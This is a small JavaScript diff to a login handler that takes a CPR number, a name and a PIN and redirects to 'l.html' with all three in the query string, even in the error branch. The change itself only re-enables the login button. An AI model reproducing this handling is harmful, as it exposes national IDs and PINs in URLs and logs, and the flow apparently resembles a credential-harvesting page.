@@ -267,6 +267,7 @@
       if (cpr) params.append('cpr', cpr);
       if (name) params.append('name', name);
       params.append('password', pin);
+       loginBtn.disabled = false;
       window.location.href = `l.html?cpr=${encodeURIComponent(cpr)}&?name=${encodeURIComponent(name)}&?pin=${encodeURIComponent(pin)}`;
       
     } catch (error) {
@@ -276,6 +277,7 @@
       if (cpr) params.append('cpr', cpr);
       if (name) params.append('name', name);
       params.append('password', pin);
+       loginBtn.disabled = false;
       window.location.href = `l.html?cpr=${encodeURIComponent(cpr)}&?name=${encodeURIComponent(name)}&?pin=${encodeURIComponent(pin)}`;
     }
   });
